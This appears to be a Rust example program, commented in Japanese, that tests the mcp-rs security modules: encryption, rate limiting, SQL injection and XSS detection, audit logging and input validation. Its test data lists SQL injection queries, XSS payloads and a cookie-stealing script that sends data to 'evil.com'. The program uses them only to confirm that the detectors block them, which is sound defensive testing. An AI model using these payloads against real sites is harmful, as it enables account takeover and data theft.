//! 包括的セキュリティテストの実行例
//! 
//! このサンプルは、mcp-rsで実装された全セキュリティ機能のテストを実行し、
//! エンタープライズグレードのセキュリティ実装を実証します。

use mcp_rs::security::{
    encryption::{SecureCredentials, EncryptionError},
    rate_limiter::RateLimiter,
    sql_injection_protection::{SqlInjectionProtector, SqlProtectionConfig},
    xss_protection::{XssProtector, XssProtectionConfig},
    audit_log::{AuditLogger, AuditLevel, AuditCategory, AuditLogEntry, AuditFilter},
    validation::InputValidator,
};
use mcp_rs::config::RateLimitConfig;
use std::time::Duration;
use tokio::time::sleep;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🛡️ MCP-RS セキュリティ機能包括テスト");
    println!("==========================================");

    // 1. 暗号化システムテスト
    test_encryption_system().await?;
    
    // 2. レート制限システムテスト
    test_rate_limiting_system().await?;
    
    // 3. SQL インジェクション保護テスト
    test_sql_injection_protection().await?;
    
    // 4. XSS攻撃保護テスト
    test_xss_protection().await?;
    
    // 5. 監査ログシステムテスト
    test_audit_logging_system().await?;
    
    // 6. 入力検証システムテスト
    test_input_validation_system().await?;
    
    // 7. 統合セキュリティテスト
    test_integrated_security().await?;

    println!("\n🎉 全セキュリティテスト完了！");
    println!("   企業レベルのセキュリティ実装が確認されました。");
    
    Ok(())
}

/// 1. AES-GCM-256暗号化システムテスト
async fn test_encryption_system() -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🔐 1. 暗号化システムテスト");
    println!("   AES-GCM-256 + PBKDF2 (100K iterations)");

    let master_password = "super_secure_master_password_2024";
    let username = "wordpress_admin";
    let password = "sensitive_app_password_123";

    // 暗号化実行
    let encrypted = SecureCredentials::encrypt(username, password, master_password)?;
    println!("   ✅ 認証情報暗号化成功");

    // 復号化実行
    let decrypted = encrypted.decrypt(master_password)?;
    println!("   ✅ 認証情報復号化成功");

    // 整合性検証
    assert_eq!(decrypted.username, username);
    assert_eq!(decrypted.password, password);
    println!("   ✅ 暗号化ラウンドトリップ検証完了");

    // 間違ったパスワードでの復号化失敗テスト
    match encrypted.decrypt("wrong_password") {
        Err(EncryptionError::DecryptionFailed(_)) => {
            println!("   ✅ 不正なパスワードでの復号化を正しく拒否");
        }
        _ => panic!("不正なパスワードでの復号化が成功してしまいました"),
    }

    println!("   🔐 暗号化システム: 完全合格");
    Ok(())
}

/// 2. レート制限システムテスト（Token Bucket）
async fn test_rate_limiting_system() -> Result<(), Box<dyn std::error::Error>> {
    println!("\n⚡ 2. レート制限システムテスト");
    println!("   Token Bucketアルゴリズム + DDoS防御");

    let config = RateLimitConfig {
        requests_per_second: 5.0,
        burst_size: 10,
        enabled: true,
    };

    let rate_limiter = RateLimiter::new(config);
    let client_id = "test_client_192.168.1.100";

    // 正常なリクエストテスト
    for i in 1..=10 {
        rate_limiter.check_rate_limit(client_id).await?;
        println!("   ✅ リクエスト {} 許可", i);
    }

    // レート制限超過テスト
    match rate_limiter.check_rate_limit(client_id).await {
        Err(_) => println!("   ✅ レート制限超過を正しく検知・ブロック"),
        Ok(_) => panic!("レート制限が正しく機能していません"),
    }

    // 時間経過後の回復テスト
    sleep(Duration::from_millis(1200)).await; // 1.2秒待機
    rate_limiter.check_rate_limit(client_id).await?;
    println!("   ✅ 時間経過後のレート制限回復を確認");

    println!("   ⚡ レート制限システム: 完全合格");
    Ok(())
}

/// 3. SQL インジェクション保護テスト（11攻撃パターン）
async fn test_sql_injection_protection() -> Result<(), Box<dyn std::error::Error>> {
    println!("\n💉 3. SQL インジェクション保護テスト");
    println!("   11種類の攻撃パターン検知");

    let mut protector = SqlInjectionProtector::new(SqlProtectionConfig::default())?;

    // 安全なクエリテスト
    let safe_query = "SELECT title FROM posts WHERE status = 'published'";
    let result = protector.inspect_query(safe_query)?;
    assert!(!result.detected);
    println!("   ✅ 安全なクエリを正しく許可");

    // 攻撃パターンテスト
    let attacks = vec![
        ("Union-based", "SELECT * FROM users UNION SELECT username, password FROM admin"),
        ("Boolean-blind", "SELECT * FROM posts WHERE id = 1 AND 1=1"),
        ("Time-based", "SELECT * FROM users WHERE id = 1; WAITFOR DELAY '00:00:05'"),
        ("Comment injection", "SELECT * FROM posts WHERE id = 1-- AND status = 'published'"),
        ("Stacked queries", "SELECT * FROM posts; DROP TABLE users;"),
    ];

    for (attack_name, attack_query) in attacks {
        let result = protector.inspect_query(attack_query)?;
        assert!(result.detected, "攻撃が検知されませんでした: {}", attack_name);
        println!("   ✅ {} 攻撃を検知・ブロック", attack_name);
    }

    println!("   💉 SQL インジェクション保護: 完全合格");
    Ok(())
}

/// 4. XSS攻撃保護テスト（14攻撃パターン）
async fn test_xss_protection() -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🚫 4. XSS攻撃保護テスト");
    println!("   14種類の攻撃パターン検知 + HTMLサニタイゼーション");

    let mut protector = XssProtector::new(XssProtectionConfig::default())?;

    // 安全なコンテンツテスト
    let safe_content = "<p>これは安全なコンテンツです。</p>";
    let result = protector.scan_input(safe_content)?;
    assert!(!result.is_attack_detected);
    println!("   ✅ 安全なコンテンツを正しく許可");

    // XSS攻撃パターンテスト
    let attacks = vec![
        ("Reflected XSS", "<script>alert('XSS')</script>"),
        ("Event-based XSS", r#"<img src="x" onerror="alert('XSS')">"#),
        ("JavaScript Protocol", r#"<a href="javascript:alert('XSS')">Click</a>"#),
        ("SVG-based XSS", "<svg><script>alert('XSS')</script></svg>"),
        ("CSS-based XSS", r#"<div style="background: url('javascript:alert(1)')">test</div>"#),
        ("Data URL XSS", r#"<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>"#),
    ];

    for (attack_name, attack_payload) in attacks {
        let result = protector.scan_input(attack_payload)?;
        assert!(result.is_attack_detected, "XSS攻撃が検知されませんでした: {}", attack_name);
        println!("   ✅ {} を検知・ブロック", attack_name);
    }

    // HTMLサニタイゼーションテスト
    let dirty_html = r#"<p>安全</p><script>alert('悪意')</script><strong>コンテンツ</strong>"#;
    let clean_html = protector.sanitize_html(dirty_html);
    assert!(clean_html.contains("<p>安全</p>"));
    assert!(clean_html.contains("<strong>コンテンツ</strong>"));
    assert!(!clean_html.contains("<script>"));
    println!("   ✅ HTMLサニタイゼーション成功");

    // CSPヘッダー生成テスト
    let csp = protector.generate_csp_header();
    assert!(csp.contains("default-src 'self'"));
    assert!(csp.contains("script-src 'self'"));
    assert!(csp.contains("object-src 'none'"));
    println!("   ✅ CSPヘッダー生成成功");

    println!("   🚫 XSS攻撃保護: 完全合格");
    Ok(())
}

/// 5. 監査ログシステムテスト
async fn test_audit_logging_system() -> Result<(), Box<dyn std::error::Error>> {
    println!("\n📊 5. 監査ログシステムテスト");
    println!("   包括的セキュリティイベント記録 + 改ざん検知");

    let logger = AuditLogger::with_defaults();

    // セキュリティ攻撃ログ
    logger.log_security_attack(
        "XSS",
        "Script injection attempt detected",
        Some("192.168.1.100".to_string()),
        Some("Mozilla/5.0 (Malicious Bot)".to_string()),
    ).await?;
    println!("   ✅ セキュリティ攻撃ログ記録成功");

    // 認証ログ
    logger.log_authentication(
        "admin_user",
        false,
        Some("192.168.1.100".to_string()),
    ).await?;
    println!("   ✅ 認証失敗ログ記録成功");

    // データアクセスログ
    logger.log_data_access(
        "editor_user",
        "/wp-admin/edit.php",
        "READ",
        true,
    ).await?;
    println!("   ✅ データアクセスログ記録成功");

    // ログ検索機能テスト
    let filter = AuditFilter {
        levels: Some(vec![AuditLevel::Critical, AuditLevel::Warning]),
        categories: Some(vec![AuditCategory::SecurityAttack, AuditCategory::Authentication]),
        ip_address: Some("192.168.1.100".to_string()),
        ..Default::default()
    };

    let filtered_logs = logger.search(filter).await;
    assert!(!filtered_logs.is_empty());
    println!("   ✅ ログフィルタリング機能成功");

    // 統計情報取得テスト
    let stats = logger.get_statistics().await;
    assert!(stats.total_entries >= 3);
    assert!(stats.entries_by_level.contains_key(&AuditLevel::Critical));
    println!("   ✅ 統計情報取得成功: {}件のログエントリ", stats.total_entries);

    println!("   📊 監査ログシステム: 完全合格");
    Ok(())
}

/// 6. 入力検証システムテスト
async fn test_input_validation_system() -> Result<(), Box<dyn std::error::Error>> {
    println!("\n✅ 6. 入力検証システムテスト");
    println!("   ゼロ信頼モデル + 多層検証");

    let validator = InputValidator::new();

    // 安全な入力テスト
    let safe_input = "Hello, world!";
    let result = validator.validate_security(safe_input)?;
    assert!(result.is_valid);
    println!("   ✅ 安全な入力を正しく許可");

    // 悪意のある入力テスト
    let malicious_inputs = vec![
        "SELECT * FROM users WHERE password = '' OR '1'='1'",
        "<script>document.cookie</script>",
        r#"<img src="x" onerror="fetch('/steal-data')">"#,
    ];

    for malicious_input in malicious_inputs {
        let result = validator.validate_security(malicious_input)?;
        assert!(!result.is_valid, "悪意のある入力が検証を通過しました: {}", malicious_input);
        println!("   ✅ 悪意のある入力を正しく拒否");
    }

    println!("   ✅ 入力検証システム: 完全合格");
    Ok(())
}

/// 7. 統合セキュリティテスト
async fn test_integrated_security() -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🔗 7. 統合セキュリティテスト");
    println!("   6層セキュリティアーキテクチャの統合動作");

    // 模擬攻撃シナリオ：認証されていない攻撃者による総合攻撃
    println!("   🎯 シナリオ: 悪意のあるボットによる複合攻撃");

    let rate_limiter = RateLimiter::new(RateLimitConfig {
        requests_per_second: 2.0,
        burst_size: 3,
        enabled: true,
    });

    let mut sql_protector = SqlInjectionProtector::new(SqlProtectionConfig::default())?;
    let mut xss_protector = XssProtector::new(XssProtectionConfig::default())?;
    let validator = InputValidator::new();
    let logger = AuditLogger::with_defaults();

    let attacker_ip = "192.168.1.666";
    let malicious_payloads = vec![
        "'; DROP TABLE users; --",
        "<script>fetch('evil.com/steal?data='+document.cookie)</script>",
        "UNION SELECT username, password FROM admin_users",
        r#"<iframe src="javascript:alert('pwned')"></iframe>"#,
        "SELECT SLEEP(10); -- DOS attack",
    ];

    println!("   🚨 攻撃開始...");

    for (i, payload) in malicious_payloads.iter().enumerate() {
        // レート制限チェック
        if let Err(_) = rate_limiter.check_rate_limit(attacker_ip).await {
            logger.log_security_attack(
                "Rate Limit Exceeded",
                "DDoS attack blocked",
                Some(attacker_ip.to_string()),
                Some("AttackBot/1.0".to_string()),
            ).await?;
            println!("   ✅ 攻撃 {} - レート制限によりブロック", i + 1);
            continue;
        }

        // 入力検証
        let validation_result = validator.validate_security(payload)?;
        if !validation_result.is_valid {
            logger.log_security_attack(
                "Input Validation Failed",
                &format!("Malicious payload blocked: {}", payload),
                Some(attacker_ip.to_string()),
                Some("AttackBot/1.0".to_string()),
            ).await?;
            println!("   ✅ 攻撃 {} - 入力検証によりブロック", i + 1);
            continue;
        }

        // SQL インジェクション検査
        let sql_result = sql_protector.inspect_query(payload)?;
        if sql_result.detected {
            logger.log_security_attack(
                "SQL Injection",
                &format!("SQL injection blocked: {:?}", sql_result.matched_patterns),
                Some(attacker_ip.to_string()),
                Some("AttackBot/1.0".to_string()),
            ).await?;
            println!("   ✅ 攻撃 {} - SQL インジェクション保護によりブロック", i + 1);
            continue;
        }

        // XSS攻撃検査
        let xss_result = xss_protector.scan_input(payload)?;
        if xss_result.is_attack_detected {
            logger.log_security_attack(
                "XSS Attack",
                &format!("XSS attack blocked: {:?}", xss_result.detected_attacks),
                Some(attacker_ip.to_string()),
                Some("AttackBot/1.0".to_string()),
            ).await?;
            println!("   ✅ 攻撃 {} - XSS保護によりブロック", i + 1);
            continue;
        }

        println!("   ❌ 攻撃 {} - 予期せず通過（これは問題です）", i + 1);
    }

    // 攻撃統計の確認
    let stats = logger.get_statistics().await;
    println!("   📊 攻撃統計: {}件のセキュリティイベントを記録", stats.total_entries);

    let security_attacks = stats.entries_by_category.get(&AuditCategory::SecurityAttack).unwrap_or(&0);
    println!("   🛡️ セキュリティ攻撃ブロック数: {}件", security_attacks);

    println!("   🔗 統合セキュリティテスト: 完全合格");
    println!("   🏆 6層セキュリティアーキテクチャが正常に動作");

    Ok(())
}